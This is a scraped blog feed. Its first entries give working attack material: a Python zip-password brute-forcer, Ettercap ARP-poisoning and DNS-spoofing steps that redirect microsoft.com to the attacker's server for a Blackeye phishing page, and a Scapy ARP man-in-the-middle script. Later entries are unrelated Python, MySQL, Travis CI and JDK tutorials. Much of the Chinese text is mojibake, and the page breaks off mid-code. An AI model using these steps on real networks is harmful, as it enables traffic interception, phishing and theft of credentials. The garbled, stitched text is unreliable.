entry.title: Penetration Testing : ä¸€ä¸ªç®€å•çš„zipæ–‡ä»¶å¯†ç ç ´è§£ç¨‹åº
entry.content:
intro

# author: huangyuhui# envir: python 3.7.3# date: november 20,2019# tested on the os: windows10# desc: brute force attack the specified zip file# repo address: https://github.com/yubuntu0109/penetration-testing-learning

code

import zipfileimport optparsefrom threading import Threaddef extractfile(zfile, password):    try:        print('[-] try to decompress the zip file by the password: %s' % password)        zfile.extractall(pwd=bytes(password, "utf8"))        print('[+] the zip file has decompressed successfully by the password: %s' % password)        exit(0)    except:        passdef main():    global zname, dname    parser = optparse.OptionParser("usage: %prog -f <file> -d <dict>")    parser.add_option('-f', dest='zname', type='string', help='specified zip file')    parser.add_option('-d', dest='dname', type='string', help='specified pwd dictionary file')    (options, args) = parser.parse_args()    if (options.zname is None) | (options.dname is None):        print(parser.usage)        exit(0)    else:        zname = options.zname        dname = options.dname    zfile = zipfile.ZipFile(zname)    pwdfile = open(dname)    for line in pwdfile.readlines():        password = line.strip('\n')        t = Thread(target=extractfile, args=(zfile, password))        t.start()if __name__ == '__main__':    main()

recommended tools

  • Common User Passwords Profiler (CUPP) : https://github.com/Mebus/cupp
  • CeWL is a Custom Word List Generator : https://github.com/digininja/CeWL

entry.content:
intro

# author: huangyuhui# date: november 27,2019# envir: 5.2.0-kali2# desc: the detailed steps about the dns attack# repo address: https://github.com/yubuntu0109/penetration-testing-learning# tested on the mobile browser: [vivo],[xiaomi],[huawei],[quark],[firefox],[qq],[360],[sogou],,

GUI: the detailed steps about the dns attack

'''[step one]: customize the dns configuration infos of Ettercap>>> vim ./etc/ettercap/etter.dns----------------------------------------------------------------------------------------------eg: modify the dns configuration infos as follow,let it redirect to specified service address==============================================================================================microsoft.comAxxx.xxx.xxx.xxx (your service ip).*microsoft.comAxxx.xxx.xxx.xxxwww.microsoft.comPRT  xxx.xxx.xxx.xxx----------------------------------------------------------------------------------------------ex: add the new configuration infos as follow if you want intercept all of websites==============================================================================================*Axxx.xxx.xxx.xxx (your service ip)*PTR xxx.xxx.xxx.xxx----------------------------------------------------------------------------------------------[step two]: MitM Attack(arp poisoning) and DNS spoofing by the penetration testing tool of Ettercap>>> ettercap -G [step three]: customize the index page and start the local server of Apache>>> vim ./var/www/html/index.html>>> /etc/init.d/apache2 start# or use this command >>> service apache2 start(recommend)use the penetration testing tool of Blackeye to replace the service of Apache or others..>>> https://github.com/YUbuntu0109/blackeye--------------------------------------------------------------------------------------------------------becaues you have modified the dns configuraiton infos above,so please test on this option: [16]Microsoft--------------------------------------------------------------------------------------------------------[step four]: check the specified service ip with this command>>> nslookup www.microsoft.com'''

(RECOMMEND)COMMAND: the detailed steps about the dns attack

'''[step one]: it's same as the first step above>>> vim ./etc/ettercap/etter.dns[step two]: MitM attack(arp poisoning) and dns spoofing by the penetration testing tool of Ettercapthe ip address between the target and the gateway is unordered>>> ettercap -i <iface> -Tq -M arp:remote -P dns_spoof /[target1]// /[target2]//[step three]: it's same as the third step above and the penetration tool of Blackeye is recommended>>> git clone https://github.com/YUbuntu0109/blackeye[step four]: it's same as the fourth step above>>> nslookup www.sitename.com'''

moments

a simple dns spoofing with phishing~

entry.title: Penetration Testing : æµé‡æ•è·ä¹‹APRç¼“å­˜æ”»å‡»
entry.content:
intro

# author: huangyuhui# date: november 25,2019# envir: 5.2.0-kali2# desc: the detailed steps and the simple codes about the dns attack# repo address: https://github.com/yubuntu0109/penetration-testing-learning

ARP MitM attack with the tool of arpspoof

'''>> scan the targete ipnmap -sP 192.168.xxx.*>> spoofing the target host: disguised as the gateway,the real identity is attackerarpspoof -i wlan0 -t 192.168.xxx.xxx(targetIP) 192.168.xxx.xxx(gateway)>> spoofing the gateway: disguised as the targetIP, the real identity is attackerarpspoof -i wlan0 -t 192.168.xxx.xxx(gatewayIP) 192.168.xxx.xxx(targetIP)>> traffic forwarding: forward the data package to the gatewayecho 1 >/proc/sys/net/ipv4/ip_forward'''

ARP Man-in-the-middle attack with python

import sysimport timeimport optparseimport subprocessfrom scapy.all import sendp, ARP, Etherdef main():''' init the parameters '''parser = optparse.OptionParser("usage: %prog -v <victimIP> -g <gatewayIP>")parser.add_option('-v', dest='victimIP', type='string', help='the specified targate ip')parser.add_option('-g', dest='gatewayIP', type='string', help='the specified gateway ip')(options, args) = parser.parse_args()if (options.victimIP == None) | (options.gatewayIP == None):print parser.usageexit(0)else:victimIP = options.victimIPgatewayIP = options.gatewayIP''' MitM attack '''try:attackGateway = Ether()/ARP(psrc=victimIP, pdst=gatewayIP)attackTarget = Ether()/ARP(psrc=gatewayIP, pdst=victimIP)print '[ok]:MitM attack is running'sendp(attackGateway, inter=1, loop=1)  # send the data package to the target host circularlysendp(attackTarget, inter=1, loop=1)  # send the data package to the gateway circularlyexcept:  # except optparser.TypeError as e:pass  # print 'error:please enter the correct parameters'# traffic forwardingn = subprocess.call('echo 1 >> /proc/sys/net/ipv4/ip_forward', shell=True)print(("[x]:the traffic forwarding hasn't opened","[ok]:the traffic forwarding has opened")[n==0])# run: python arpspoofing.py -v <victim ip> -g <gateway ip># test: see the effects by the tool of driftnet : driftnet -v -b -i wlan0(interface name)if __name__ == '__main__':main()

moments

ğŸ˜… a simple arp spoofing~

recommended tools

  • kickthemout : https://github.com/k4m4/kickthemout
  • arpspoof : https://github.com/byt3bl33d3r/arpspoof
  • Python ARP Poisoner : https://github.com/Sha2ow-M4st3r/PAPoisoner

entry.title: Pythonæ“ä½œMySQLæ•°æ®åº“ä¹‹åŸºæœ¬çš„CURD
entry.content:
å­¦ä¹ ç¬”è®° : Python æ“ä½œ MySQL æ•°æ®åº“ä¹‹åŸºæœ¬çš„ CURD

ğŸ å­¦ä¹ å®Œ Python çš„åŸºç¡€çŸ¥è¯†åï¼Œå½“ç„¶éœ€è¦è¿›é˜¶åœ°å­¦ä¹ å…³äº Python çš„æ•°æ®åº“ç¼–ç¨‹çŸ¥è¯†å•¦~ ä¸‹é¢æ˜¯æˆ‘å†™çš„ä¸€ä¸ªæ“ä½œ MySQL æ•°æ®åº“çš„åŸºæœ¬å¢åˆ æ”¹æŸ¥ï¼Œå…¶å¯¹äºå’Œæˆ‘ä¸€æ ·åˆå­¦ Python çš„åŒå­¦æ¥è¯´ï¼Œéå¸¸å…·æœ‰å‚è€ƒä¸å­¦ä¹ ä»·å€¼å“Ÿ~

  1. tb_user : æ•°æ®åº“è¡¨ç»“æ„
    CREATE TABLE `tb_user` (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,  `sex` char(1) COLLATE utf8mb4_unicode_ci DEFAULT NULL,  `phone` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
  1. dbconfig.ini : å­˜å‚¨æ•°æ®åº“çš„é…ç½®ä¿¡æ¯
    [DATABASE_CONFIGURATION_INFOS]host = localhostuser = rootpassword = database = charset = utf8
  1. Utils.py : è¿æ¥æ•°æ®åº“çš„å·¥å…·ç±»
    """Project name : python-learningDescription : A SIMPLE TOOL FOR OPERATING DATABASEAuthor : é»„å®‡è¾‰Version : 1.0Website : https://yubuntu0109.github.io/Created on 11/12/2019-9:30 PM"""import configparserimport pymysqlclass DBUtils:    """    get the databse configuration infos from the specified file    """    @staticmethod    def getConnConfig():        try:            configpar = configparser.ConfigParser()            configpar.read("dbconfig.ini", encoding='utf-8')            connConfig_items = dict(configpar.items('DATABASE_CONFIGURATION_INFOS'))            return connConfig_items        except FileNotFoundError as e:            print("CATCH THE EXCEPTION INFO : %s" % e)    """    get the database connection object    """    @staticmethod    def getConnection():        try:            global connection  # defined a global connection object            connConfig = DBUtils.getConnConfig()  # get the database configuration infos            connection = pymysql.connect(host=connConfig.get('host'),                                         user=connConfig.get('user'),                                         password=connConfig.get('password'),                                         database=connConfig.get('database'),                                         charset=connConfig.get('charset'))            return connection        except Exception as e:            print("FAIL TO CONNECT TO THE DATABASE : %s" % e)
  1. CURD.py : æ“ä½œæ•°æ®åº“çš„æµ‹è¯•ç±»
    """Project name : python-learningDescription : BASIC CURD ON MYSQL DATABASEAuthor : é»„å®‡è¾‰Version : 1.0Website : https://yubuntu0109.github.io/Created on 11/11/2019-10:08 PM"""import pymysqlfrom Utils import DBUtils  # format : from filename import classnameclass CURDTest:    def __init__(self):        global connection  # defined a global variable        connection = DBUtils.getConnection()  # get the database connection    """    select the specified user info by id    """    @classmethod    def selectById(cls, userid):        try:            # create the cursor object            with connection.cursor() as cursor:                # defined the sql statement                sql = 'SELECT id,name,sex,phone FROM tb_user WHERE id = %s'                # execute the specified sql statement                cursor.execute(sql, [userid])                # get the result                row = cursor.fetchone()                # ouput the result                if row is not None:                    print('ID:{0} - NAME:{1} - SEX:{2} - PHONE:{3}'.format(row[0], row[1], row[2], row[3]))                else:                    print("NOT FOUND THE SPECIFIED USER INFO BY ID : %s" % userid)        # catch the exception about database        except pymysql.DatabaseError as e:            print(e)        # release the connection resource        finally:            connection.close()    """    select all of user infos    """    @classmethod    def selectAll(cls):        try:            with connection.cursor() as cursor:                sql = 'SELECT id,name,sex,phone FROM tb_user'                cursor.execute(sql)                result_set = cursor.fetchall()                for row in result_set:                    print('ID:{0} - NAME:{1} - SEX:{2} - PHONE:{3}'.format(row[0], row[1], row[2], row[3]))        except pymysql.DatabaseError as e:            print(e)        finally:            connection.close()    """    insert the user info    """    @classmethod    def addUser(cls, username, sex, telephone):        try:            with connection.cursor() as cursor:                sql = 'INSERT INTO tb_user(name,sex,phone) VALUE (%s,%s,%s)'                affectedcount = cursor.execute(sql, (username, sex, telephone))                print('inserted successfully and the affected count : %s' % affectedcount)                connection.commit()        except pymysql.DatabaseError as e:            print(e)            connection.rollback()        finally:            connection.close()    """    update the user info    """    @classmethod    def updateUser(cls, username, sex, telephone, userid):        try:            with connection.cursor() as cursor:                sql = 'UPDATE tb_user SET name = %s, sex = %s, phone = %s WHERE id = %s'                affectedcount = cursor.execute(sql, (username, sex, telephone, userid))                print('updated successfully and the affected count : %s' % affectedcount)                connection.commit()        except pymysql.DatabaseError as e:            print(e)            connection.rollback()        finally:            connection.close()    """    delete the user info    """    @classmethod    def delUser(cls, userid):        try:            with connection.cursor() as cursor:                sql = 'DELETE FROM tb_user WHERE id = %s'                affectedcount = cursor.execute(sql, userid)                print("deleted successfully and the affected count : %s" % affectedcount)                connection.commit()        except pymysql.DatabaseError as e:            print(e)            connection.rollback()        finally:            connection.close()"""test"""curd = CURDTest()curd.selectAll()# curd.selectById(userid=1)# curd.addUser(username='addUser', sex='m', telephone='00000000000')# curd.updateUser(username='updateUser', sex='f', telephone='11111111111', userid=1)# curd.delUser(userid=1)
  1. ç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤º( ä»…ä¾›å‚è€ƒ ) :
    ID:1 - NAME:é»„å®‡è¾‰ - SEX:ç”· - PHONE:11111111111ID:2 - NAME:ç‡•å­ - SEX:å¥³ - PHONE:00000000000

entry.title: hello Python
entry.content:
å­¦ä¹ ç¬”è®° : hello Python

Python ç®€ä»‹

Python ( è‹±å›½å‘éŸ³ï¼š/ËˆpaÉªÎ¸É™n/ï¼Œç¾å›½å‘éŸ³ï¼š/ËˆpaÉªÎ¸É‘Ën/ )ï¼Œæ˜¯ä¸€ç§é¢å‘å¯¹è±¡çš„è§£é‡Šå‹è®¡ç®—æœºç¨‹åºè®¾è®¡è¯­è¨€ï¼Œç”±è·å…°äºº GuidovanRossum äº 1989 å¹´å‘æ˜ï¼Œç¬¬ä¸€ä¸ªå…¬å¼€å‘è¡Œç‰ˆå‘è¡Œäº 1991 å¹´

Python æ˜¯çº¯ç²¹çš„è‡ªç”±è½¯ä»¶ï¼Œæºä»£ç å’Œè§£é‡Šå™¨ CPython éµå¾ª GPL( GNUGeneralPublicLicense )åè®®. Pythonè¯­æ³•ç®€æ´æ¸…æ™°ï¼Œç‰¹è‰²ä¹‹ä¸€æ˜¯å¼ºåˆ¶ç”¨ç©ºç™½ç¬¦( whitespace )ä½œä¸ºè¯­å¥ç¼©è¿›

Python çš„åº”ç”¨

  • ç³»ç»Ÿç¼–ç¨‹
  • å›¾å½¢å¤„ç†
  • æ•°å­¦å¤„ç†
  • æ–‡æœ¬å¤„ç†
  • æ•°æ®åº“ç¼–ç¨‹
  • ç½‘ç»œç¼–ç¨‹
  • Webç¼–ç¨‹
  • å¤šåª’ä½“åº”ç”¨
  • pymoå¼•æ“
  • é»‘å®¢ç¼–ç¨‹

Python çš„åº”ç”¨é¢†åŸŸ

  • Web åº”ç”¨å¼€å‘
  • æ“ä½œç³»ç»Ÿç®¡ç†ï¼ŒæœåŠ¡å™¨è¿ç»´çš„è‡ªåŠ¨åŒ–è„šæœ¬
  • ç§‘å­¦è®¡ç®—
  • æ¡Œé¢è½¯ä»¶
  • æœåŠ¡å™¨è½¯ä»¶( ç½‘ç»œè½¯ä»¶ )
  • æ¸¸æˆ
  • æ„æ€å®ç°ï¼Œäº§å“æ—©æœŸåŸå‹è¿­ä»£

Python çš„åº”ç”¨æ–¹å‘

  • å¸¸è§„è½¯ä»¶å¼€å‘
  • ç§‘å­¦è®¡ç®—
  • è‡ªåŠ¨åŒ–è¿ç»´
  • äº‘è®¡ç®—
  • WEBå¼€å‘
  • ç½‘ç»œçˆ¬è™«
  • æ•°æ®åˆ†æ
  • äººå·¥æ™ºèƒ½

Python ç¨‹åºçš„æ‰§è¡ŒåŸç†

Python ä¸åŒäºç±»ä¼¼ C/C++ ä¹‹ç±»çš„ç¼–è¯‘æ€§è¯­è¨€ï¼Œå…¶ä¸éœ€è¦ç¼–è¯‘æˆäºŒè¿›åˆ¶ä»£ç ï¼Œå®ƒå¯ä»¥ç›´æ¥ä»æºä»£ç è¿è¡Œç¨‹åº. æ—¢ Python è§£é‡Šå™¨å…ˆä¼šå°†æºä»£ç è½¬æ¢ä¸ºå­—èŠ‚ç ( å¹¶éäºŒè¿›åˆ¶æœºå™¨ç ï¼Œå…¶éœ€è¦è¿›ä¸€æ­¥ç¼–è¯‘æ‰èƒ½å¤Ÿè¢«æœºå™¨è¯†åˆ«. å¦‚æœ Python è¿›ç¨‹åœ¨æœºå™¨ä¸Šæ‹¥æœ‰å†™å…¥æƒé™ï¼Œé‚£ä¹ˆå®ƒå°†æŠŠç¨‹åºçš„å­—èŠ‚ç ä¿å­˜ä¸ºä¸€ä¸ªä»¥.pycä¸ºæ‰©å±•åçš„æ–‡ä»¶ )ï¼Œç„¶åå†æŠŠç¼–è¯‘å¥½çš„å­—èŠ‚ç è½¬å‘åˆ° Python è™šæ‹Ÿæœº( PVM )ä¸­è¿›è¡Œæ‰§è¡Œ.

å®ç°ä¸€ä¸ªç®€å•çš„å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ

æ—©ä¸Šåœ¨å›¾ä¹¦é¦†èŠ±äº†2ä¸ªå°æ—¶å·¦å³æ—¶é—´çœ‹å®Œäº† ã€ŠPython å¿«é€Ÿç¼–ç¨‹å…¥é—¨ã€‹ ä¹¦ç±çš„å‰å…­ç« ï¼Œæ¯•ç«Ÿæˆ‘æ˜¯æœ‰ç¼–ç¨‹åŸºç¡€çš„å˜¿å˜¿ï¼Œå†µä¸”ç¼–ç¨‹è¯­è¨€ä¹‹é—´æ˜¯ç›¸é€šçš„. ä¸ºäº†ç†Ÿæ‚‰ Python å‡½æ•°çš„åŸºæœ¬ä½¿ç”¨ï¼Œæ™šä¸Šå›åˆ°å¯å®¤å†™äº†ä¸€ä¸ªç®€å•çš„å­¦ç”Ÿç®¡ç†ç³»ç»Ÿï¼Œç›¸æ¯” hello world implemented by Python ç¨‹åºæ˜¯ä¸æ˜¯æœ‰ç‚¹æ€¥å•¦å“ˆå“ˆå“ˆ~ ä»£ç å¦‚ä¸‹æ‰€ç¤º :

"""Project name : python-learningDescription : A SIMPLE STUDENT MANAGEMENT SYSTEMAuthor : é»„å®‡è¾‰Version : 1.0Website : https://yubuntu0109.github.io/Created on 11/8/2019-6:47 PM"""# CREATE A LIST WHICH BE USED TO STORE ALL OF STUDENT INFORMATIONSstudent_infos = []# OUTPUT THE MENU INFO INTO THE CONSOLEdef print_menu():    print("=" * 50)    print("### A SIMPLE STUDENT MANAGEMENT SYSTEM v1.0 ###")    print("1:ADD THE STUDENT INFORMATION")    print("2:DELETE THE STUDENT INFORMATION")    print("3:MODIFY THE STUDENT INFORMATION")    print("4:DISPLAY ALL OF STUDENT INFORMATIONS")    print("5:SAVE ALL OF STUDENT INFORMATIONS")    print("0:EXIT")    print("=" * 50)# ADD A NEW STUDENT INFORMATIONdef add_info():    new_name = input("PLEASE ENTER THE NEW STUDENT'S NAME: ")    new_sex = input("PLEASE ENTER THE NEW STUDENT'S SEX: ")    new_phone = input("PLEASE ENTER THE NEW STUDENT'S PHONE: ")    new_info = {'name': new_name, 'sex': new_sex, 'phone': new_phone}    student_infos.append(new_info)# DELETE THE SPECIFIED STUDENT INFORMATION BY NOdef del_info():    del_number = int(input("PLEASE THE SPECIFIED STUDENT' NO: ")) - 1  # index    del student_infos[del_number]# MODIFY THE SPECIFIED STUDENT INFORMATION BY NOdef modify_info():    student_id = int(input("PLEASE THE STUDENT NO: "))    new_student_name = input("PLEASE ENTER THE NEW NAME: ")    new_student_sex = input("PLEASE ENTER THE NEW SEX: ")    new_student_phone = input("PLEASE ENTER THE NEW PHONE: ")    student_infos[student_id - 1]['name'] = new_student_name    student_infos[student_id - 1]['sex'] = new_student_sex    student_infos[student_id - 1]['phone'] = new_student_phone# DISPLAY ALL OF STUDENT INFORMATIONSdef show_infos():    print("=" * 50)    print("ALL OF STUDENT INFORMATION BE SHOWED AS FOLLOW")    print("=" * 50)    print("NO       NAME        SEX     PHONE")    i = 1    for temp in student_infos:        print("%d       %s      %s      %s" % (i, temp['name'], temp['sex'], temp['phone']))        i += 1# SAVE ALL OF STUDENT INFORMATIONSdef save_data():    try:        file = open("db.data", "w")        file.write(str(student_infos))        file.close()    except FileNotFoundError:        print("CATCH THE EXCEPTION: THE SPECIFIED FILE NOT EXIST!")    else:  # so simple and so cool than Java        print("SAVE ALL OF STUDENT INFORMATIONS SUCCESSFULLY")# RECOVER ALL OF STUDENT INFORMATIONSdef recover_data():    global student_infos    try:        file = open("db.data", "wb+")  # create new file if the specified file not exist        content = file.read()        print(content)  # throw the SyntaxError possibly: unexpected EOF while parsing        student_infos = eval(content)        file.close()    except (SyntaxError, FileNotFoundError) as exception_info:        print("CATCH THE EXCEPTION: %s" % exception_info)# MAIN FUNCTIONdef main():    recover_data()  # the specified file must store some datas before reading    while True:        print_menu()        key = input("PLEASE ENTER THE SPECIFIED NO OF MENU: ")        if key == '1':            add_info()        elif key == '2':            del_info()        elif key == '3':            modify_info()        elif key == '4':            show_infos()        elif key == '5':            save_data()        elif key == '0':            quit_confirm = input("ARE YOU SURE TO QUIT ?( Yes or No ): ")            if quit_confirm == "Yes":                break            else:                print("ERROR : PLEASE ENTER THE RIGHT COMMAND !")# RUNmain()

ç¨‹åºè¿è¡Œç»“æœå¦‚ä¸‹æ‰€ç¤º :

ä½¿ç”¨ Python å†™å®Œè¿™ä¸ªç®€å•ç¨‹åºåï¼Œè®©æˆ‘æŒ‡é—´æ„Ÿè§‰è¶…è½»æ¾ï¼Œè¿™è¯­æ³•å¤ªç®€æ´äº†å§! ç¬¦åˆæˆ‘çš„é£æ ¼å˜¿å˜¿~

æ¨èç»™åˆå­¦ Python åŒå­¦çš„ç¼–ç¨‹ä¹¦ç± : ã€ŠPython å¿«é€Ÿç¼–ç¨‹å…¥é—¨ã€‹- é»‘é©¬ç¨‹åºå‘˜ç¼–è‘— ( æœ¬ä¹¦å¯¹äºç°åœ¨çš„æˆ‘æ¥è¯´ï¼Œä¸€å‘¨å°±å¯ä»¥å®Œæˆå…¨éƒ¨çš„å­¦ä¹ å’¯~ )

entry.title: ä½¿ç”¨Travis CIæŒç»­é›†æˆæˆ‘çš„å¼€æºåšå®¢
entry.content:
å­¦ä¹ ç¬”è®° : ä½¿ç”¨ Travis CI æŒç»­é›†æˆæˆ‘çš„ Hexo å¼€æºåšå®¢

Travis CI for beginner

The following content from : https://docs.travis-ci.com/user/for-beginners/

What Is Continuous Integration (CI)?

Continuous Integration is the practice of merging in small code changes
frequently - rather than merging in a large change at the end of a development
cycle. The goal is to build healthier software by developing and testing in smaller
increments. This is where Travis CI comes in.

As a continuous integration platform, Travis CI supports your development
process by automatically building and testing code changes, providing immediate
feedback on the success of the change. Travis CI can also automate other parts
of your development process by managing deployments and notifications.

CI Builds and Automation: Building, Testing, Deploying

When you run a build, Travis CI clones your GitHub repository into a brand-new
virtual environment, and carries out a series of tasks to build and test your
code. If one or more of those tasks fail, the build is considered
broken. If none of the tasks fail, the build is
considered passed and Travis CI can deploy your code
to a web server or application host.

CI builds can also automate other parts of your delivery workflow. This means
you can have jobs depend on each other with Build Stages,
set up notifications, prepare
deployments after builds and many other tasks.

Builds, Jobs, Stages and Phases

In the Travis CI documentation, some common words have specific meanings:

  • phase - the sequential steps
    of a job. For example, the install phase, comes before the script phase,
    which comes before the optional deploy phase.
  • job - an automated process that clones your repository into a virtual
    environment and then carries out a series of phases such as compiling your
    code, running tests, etc. A job fails, if the return code of the script phase
    is non-zero.
  • build - a group of jobs. For example, a build might have two jobs, each
    of which tests a project with a different version of a programming language.
    A build finishes when all of its jobs are finished.
  • stage - a group of jobs that run in parallel as part of a sequential build
    process composed of multiple stages.

Breaking the Build

The build is considered broken, when one or more of its jobs complete with a
state that is not passed:

  • errored - a command in the before_install, install, or before_script
    phase returned a non-zero exit code. The job stops immediately.
  • failed - a command in the script phase returned a non-zero exit code. The
    job continues to run until it completes.
  • canceled - a user cancels the job before it completes.

Our Common Builds Problems page is a good place
to start troubleshooting why your build is broken.

Infrastructure and Environment Notes

Travis CI offers a few different infrastructure environments, so you can select
the setup that suits your project best:

  • Ubuntu Linux - these Linux Ubuntu environments run inside full virtual machines, provide plenty of computational resources, and support the use of sudo, setuid, and setgid. Check out more information on the Ubuntu Linux Build Environment.
  • macOS - uses one of several versions of the macOS operating system. This environment is useful for building projects that require the macOS software, such as projects written in Swift. It is not a requirement to use the macOS environment, if you develop on a macOS machine. Here you can find more details on the macOS Build Environment.
  • Windows - currently Windows Server version 1803 is supported. If you want to know more about it, see the Windows Build Environment.

More details on our build environments are available in our CI Environment documentation.

ğŸš€ Now that youâ€™ve read the basics, head over to our Tutorial for details on setting up your first build! Travis CI User Documentaiton : https://docs.travis-ci.com/ and the open source address of docs: https://github.com/travis-ci/docs-travis-ci-com

Continuous Ingration with my Hexo blog

å°† Travis CI æŒç»­é›†æˆåˆ° Hexo blog çš„åŸºæœ¬æ­¥éª¤å¦‚ä¸‹,è¯¦ç»†ä¿¡æ¯è¯·å‚è€ƒæ–‡ç« æœ€ä¸‹æ–¹çš„ Reference

  1. åˆ›å»º Travis CI è´¦æˆ·
  2. ç”Ÿæˆå¹¶é…ç½® Access Token
  3. åˆ›å»º .travis.yml é…ç½®æ–‡ä»¶
  4. å‘å¸ƒæ–°åšå®¢( æµ‹è¯•æ˜¯å¦æˆåŠŸé›†æˆ Travis CI )

æˆåŠŸé›†æˆ Travis CI åï¼Œå¾€åæ¯å†™å®Œä¸€ç¯‡åšå®¢æ–‡ç« åç›´æ¥ pull åˆ°è¿œç¨‹ä»“åº“å³å¯( éƒ½å·²ç»é›†æˆ CI äº†ï¼Œå°±ä¸è¦å‡ ç¯‡å‡ ç¯‡çš„ä¸€èµ· pull å•¦~ )ï¼Œæ—¢ä¸éœ€è¦å†åœ¨æœ¬åœ°æ‰§è¡Œå°† Markdown æ ¼å¼ç¼–å†™çš„åšå®¢æ–‡ç« ç”Ÿæˆ HTML é¡µé¢å¹¶éƒ¨ç½²åˆ°è¿œç¨‹ä»“åº“çš„å‘½ä»¤å’¯! æˆåŠŸ pull åˆ°è¿œç¨‹ä»“åº“åï¼ŒTravis CI ä¼šå…ˆé€ä¸ªæµ‹è¯•ä½ çš„ commit æ˜¯å¦ä¼šå¯¹ Hexo blog è¿è¡Œç¯å¢ƒé€ æˆå½±å“ï¼Œå…¶åä¾¿å°è¯•è¿è¡Œä½ æ‰€å®šä¹‰çš„è„šæœ¬( hexo clean + hexo g + Â· Â· Â·). . . è¯¦æƒ…å¯å‚è€ƒæˆ‘çš„ Travis CI é…ç½®æ–‡ä»¶ : .travis.yml

Introduce my personal blog

JDK 13 is the open-source reference implementation of version 13 of the Java SE Platform as specified by by JSR 388 in the Java Community Process. JDK 13 reached General Availability on 17 September 2019. Production-ready binaries under the GPL are available from Oracle; binaries from other vendors will follow shortly. The features and schedule of this release were proposed and tracked via the JEP Process, as amended by the JEP 2.0 proposal. The release was produced using the JDK Release Process (JEP 3).

ç‰¹æ€§

Switch Expressions ç‰¹æ€§æ¼”ç¤º

 /*JDK12ä¹‹å‰ç‰ˆæœ¬çš„å†™æ³•:è®¸å¤šbreakä½¿å®ƒä¸å¿…è¦åœ°å†—é•¿,å¦‚æœå¿˜è®°å†™break,åˆ™ä¼šäº§ç”Ÿæ„æ–™ä¹‹å¤–çš„ç»“æœæˆ–è€…å¼‚å¸¸,æ‰€ä»¥é’ˆå¯¹äºæ­¤jdk12åœ¨è¿™é‡Œè¿›è¡Œäº†ä¼˜åŒ–å‡çº§*/switch (score) {    case 60:        System.out.println("åŠæ ¼");        break;    case 80:        System.out.println("è‰¯å¥½");        break;    case 90:        System.out.println("ä¼˜ç§€");        break;    default:        System.out.println("default");        break;}/*JDK12æ–°ç‰¹æ€§å†™æ³•:æˆ‘ä»¬å»ºè®®å¼•å…¥ä¸€ç§æ–°å½¢å¼çš„å¼€å…³æ ‡ç­¾,å†™æˆ"case L ->"è¡¨ç¤ºå¦‚æœæ ‡ç­¾åŒ¹é…,åˆ™åªæ‰§è¡Œæ ‡ç­¾å³ä¾§çš„ä»£ç */switch (score) {    case 60 -> System.out.println("åŠæ ¼");    case 80 -> System.out.println("è‰¯å¥½");    case 90 -> System.out.println("ä¼˜ç§€");    default -> System.out.println("default");}/*JDK13æ–°ç‰¹æ€§å†™æ³•:ä¼˜åŒ–JDK12ä¸­çš„switchè¯­æ³•æ–°ç‰¹æ€§,ä½¿å…¶æ›´åŠ ç®€æ´~*/System.out.println(        switch (score) {            case 60 -> "åŠæ ¼";            case 80 -> "è‰¯å¥½";            case 90 -> "ä¼˜ç§€";            default -> "default";        });

Text Blocks ç‰¹æ€§æ¼”ç¤º

//è§£é‡Š:å·¦è¾¹çš„æ–‡æœ¬å—ç›¸å½“äºå³è¾¹çš„å­—ç¬¦ä¸²æ–‡å­—/*"""line1line2   ------>>>   "line 1
line 2
line 3
"line3"""*//*HTML ç¤ºä¾‹ç¨‹åº*///JDK13ç‰ˆæœ¬å‰çš„å†™æ³•String html = "<html>
" +        "    <body>

";//JDK13è¯­æ³•æ–°ç‰¹æ€§çš„å†™æ³•String html2 =        """            <html>                <body>                    <p>Hello, world</p>                </body>            </html>        """;/*SQL ç¤ºä¾‹ç¨‹åº*/ //JDK13ç‰ˆæœ¬å‰çš„å†™æ³•String query = "SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB`

";//JDK13æ–°ç‰¹æ€§çš„å†™æ³•String query2 =        """        SELECT `EMP_ID`, `LAST_NAME` FROM `EMPLOYEE_TB`        WHERE `CITY` = 'INDIANAPOLIS'        ORDER BY `EMP_ID`, `LAST_NAME`;        """;

JDK 12 is the open-source reference implementation of version 12 of the Java SE Platform as specified by by JSR 386 in the Java Community Process. JDK 12 reached General Availability on 19 March 2019. Production-ready binaries under the GPL are available from Oracle; binaries from other vendors will follow shortly. The features and schedule of this release were proposed and tracked via the JEP Process, as amended by the JEP 2.0 proposal. The release was produced using the JDK Release Process (JEP 3).

Switch Expressions ç‰¹æ€§æ¼”ç¤º

int score = new Random(100).nextInt();/*JDK12ä¹‹å‰ç‰ˆæœ¬çš„å†™æ³•:è®¸å¤šbreakä½¿å®ƒä¸å¿…è¦åœ°å†—é•¿,å¦‚æœå¿˜è®°å†™break,åˆ™ä¼šäº§ç”Ÿæ„æ–™ä¹‹å¤–çš„ç»“æœæˆ–è€…å¼‚å¸¸,æ‰€ä»¥é’ˆå¯¹äºæ­¤jdk12åœ¨è¿™é‡Œè¿›è¡Œäº†ä¼˜åŒ–å‡çº§*/switch (score) {    case 60:        System.out.println("åŠæ ¼");        break;    case 80:        System.out.println("è‰¯å¥½");        break;    case 90:        System.out.println("ä¼˜ç§€");        break;    default:        System.out.println("default");        break;}/*JDK12æ–°ç‰¹æ€§å†™æ³•:æˆ‘ä»¬å»ºè®®å¼•å…¥ä¸€ç§æ–°å½¢å¼çš„å¼€å…³æ ‡ç­¾,å†™æˆ"case L ->"è¡¨ç¤ºå¦‚æœæ ‡ç­¾åŒ¹é…,åˆ™åªæ‰§è¡Œæ ‡ç­¾å³ä¾§çš„ä»£ç :*/switch (score) {    case 60 -> System.out.println("åŠæ ¼");    case 80 -> System.out.println("è‰¯å¥½");    case 90 -> System.out.println("ä¼˜ç§€");    default -> System.out.println("default");}/*JDK12å‰çš„å†™æ³•:è®¸å¤šSwitchè¡¨è¾¾å¼,æ¯ä¸ªcaseéƒ½ä¼šèµ‹å€¼ç»™ä¸€ä¸ªå˜é‡æˆ–è€…æ‰§è¡ŒæŸç§æ“ä½œ,å¦‚ä¸‹æ˜¯èµ‹å€¼ç»™numLetterså˜é‡å…·ä½“å€¼:*/int numLetters;switch (score) {    case 60:    case 70:        numLetters = 6;        break;    case 80:    case 90:        numLetters = 7;        break;    case 100:        numLetters = 8;        break;    default:        throw new 